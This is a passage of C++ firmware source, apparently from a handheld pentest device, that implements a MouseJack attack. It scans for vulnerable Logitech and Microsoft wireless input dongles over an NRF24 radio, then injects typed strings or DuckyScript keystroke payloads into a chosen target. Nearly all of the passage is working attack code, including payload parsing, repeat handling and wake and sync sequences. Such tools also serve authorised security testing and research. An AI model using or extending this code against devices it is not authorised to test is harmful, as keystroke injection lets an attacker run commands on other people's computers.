    tft.drawCentreString(
        "[" + String(mj_getTypeLabel(target.type)) + "] " + mj_formatAddr(target), tftWidth / 2, cy, 1
    );
    cy += 16;
    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
    tft.drawCentreString("Running script...", tftWidth / 2, cy, 1);
    cy += 16;

    // Show filename
    int lastSlash = filepath.lastIndexOf('/');
    String fname = (lastSlash >= 0) ? filepath.substring(lastSlash + 1) : filepath;
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString(fname, tftWidth / 2, cy, 1);

    if (!mj_validateNrfMode()) return;

    File file = fs->open(filepath, FILE_READ);
    if (!file) {
        displayError("Cannot open file", true);
        return;
    }

    if (!nrf_start(mj_nrfMode)) {
        file.close();
        displayError("NRF24 not found", true);
        return;
    }

    mj_setupTxForTarget(target);
    mj_logitechWake(target);

    // Sync sequence for Microsoft
    if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
        mj_msSequence = 0;
        for (int i = 0; i < 6; i++) {
            mj_msTransmit(target, 0, 0);
            delay(2);
        }
    }

    uint16_t defaultDelayMs = 0;
    String lastLine;

    while (file.available()) {
        if (check(EscPress)) break;

        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;

        // DEFAULT_DELAY
        if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
            defaultDelayMs = (uint16_t)line.substring(line.indexOf(' ') + 1).toInt();
            if (defaultDelayMs > 10000) defaultDelayMs = 10000;
            continue;
        }

        // REPEAT
        if (line.startsWith("REPEAT ")) {
            int reps = line.substring(7).toInt();
            if (reps < 1) reps = 1;
            if (reps > 500) reps = 500;
            for (int r = 0; r < reps; r++) {
                if (check(EscPress)) break;
                if (lastLine.length() > 0) { mj_parseDuckyLine(lastLine, target); }
            }
            continue;
        }

        mj_parseDuckyLine(line, target);
        lastLine = line;

        if (defaultDelayMs > 0) delay(defaultDelayMs);
    }

    file.close();
    NRFradio.powerDown();
    displaySuccess("Script complete", true);
}

// ══════════════════════════════════════════════════════════════════
// ═══════════════ TARGET LIST & ATTACK MENU ═════════════════════
// ══════════════════════════════════════════════════════════════════

static void mj_attackMenu(int targetIndex) {
    const MjTarget &target = mj_targets[targetIndex];

    options = {
        {"Inject String", [&]() { mj_attackString(targetIndex); }},
        {"DuckyScript",   [&]() { mj_attackDucky(targetIndex); } },
        {"Back",          [=]() { /* return */ }                 },
    };

    String title = String("[") + mj_getTypeLabel(target.type) + "] " + mj_formatAddr(target);
    loopOptions(options, MENU_TYPE_SUBMENU, title.c_str());
}

static void mj_targetListMenu() {
    if (mj_targetCount == 0) {
        displayWarning("No targets found", true);
        return;
    }

    bool inList = true;
    while (inList) {
        options.clear();
        for (int i = 0; i < mj_targetCount; i++) {
            String label = String("[") + mj_getTypeLabel(mj_targets[i].type) + "] " +
                           mj_formatAddr(mj_targets[i]) + " ch" + String(mj_targets[i].channel);
            int idx = i;
            options.push_back({label.c_str(), [idx]() { mj_attackMenu(idx); }});
        }
        options.push_back({"Rescan", [&]() { mj_scan(); }});
        options.push_back({"Back", [&]() { inList = false; }});

        loopOptions(options, MENU_TYPE_SUBMENU, "Targets");
        if (returnToMenu) return;
    }
}

// ══════════════════════════════════════════════════════════════════
// ═══════════════ MAIN MOUSEJACK MENU ══════════════════════════
// ══════════════════════════════════════════════════════════════════

void nrf_mousejack() {
    options = {
        {"Set NRF Mode",
         [=]() {
             NRF24_MODE selected = nrf_setMode();
             if (selected != NRF_MODE_DISABLED) mj_nrfMode = selected;
         }                                             },
        {"Scan Devices",
         [=]() {
             if (mj_scan()) {
                 mj_targetListMenu();
             } else {
                 displayInfo("No devices found", true);
             }
         }                                             },
        {"View Targets", [=]() { mj_targetListMenu(); }},
        {"Main Menu",    [=]() { returnToMenu = true; }},
    };

    loopOptions(options, MENU_TYPE_SUBMENU, "MouseJack");
}
